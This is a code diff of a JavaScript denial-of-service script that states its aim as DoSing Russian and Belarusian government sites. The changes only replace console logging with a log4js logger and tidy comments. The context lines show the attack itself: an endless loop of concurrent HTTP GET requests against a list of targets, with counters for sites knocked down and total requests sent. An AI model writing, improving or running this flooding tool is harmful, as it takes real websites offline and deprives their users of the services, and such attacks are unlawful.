@@ -1,6 +1,8 @@
 const axios = require('axios')
+const log = require('log4js').getLogger('dos-attack')
 
 axios.defaults.validateStatus = () => true
+log.level = "INFO"
 
 const LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS = 60
 const SITE_TIMEOUT_IN_MS = 2000
@@ -198,7 +200,7 @@ function isDown (lastSuccessfulResponseTime) {
 }
 
 async function main () {
-  console.log('Starting to DoS russian/belarusian gov sites')
+  log.info('Starting to DoS russian/belarusian gov sites')
 
   let totalRequests = 0
   const requests = targets.reduce((res, target) => {
@@ -208,15 +210,11 @@ async function main () {
 
   setInterval(() => {
     const downSites = Object.values(requests).filter(r => isDown(r.lastSuccessfulResponseTime))
-    console.log(`Total down sites: ${downSites.length}/${Object.keys(requests).length}`)
-    console.log(`Total request count: ${totalRequests}`)
+    log.info(`Total down sites: ${downSites.length}/${Object.keys(requests).length}`)
+    log.info(`Total request count: ${totalRequests}`)
   }, 30000)
 
   while (true) {
-    // const upSites = Object.entries(requests).reduce((res, [url, value]) => {
-    //   if (!isDown(value.lastSuccessfulResponseTime)) res[url] = value
-    //   return res
-    // }, {})
     const responses = await axios.all(Object.keys(requests).map(url => axios({
       method: 'get',
       timeout: SITE_TIMEOUT_IN_MS,
@@ -239,8 +237,8 @@ async function main () {
       }
     })
 
-    await new Promise(resolve => setTimeout(resolve, 100)); // delay for releasing event-loop for printing logo
+    await new Promise(resolve => setTimeout(resolve, 100)) // delay for releasing event-loop for printing logo
   }
 }
 
-main().catch(e => console.log(e.stack))
+main().catch(e => log.error(e.stack))
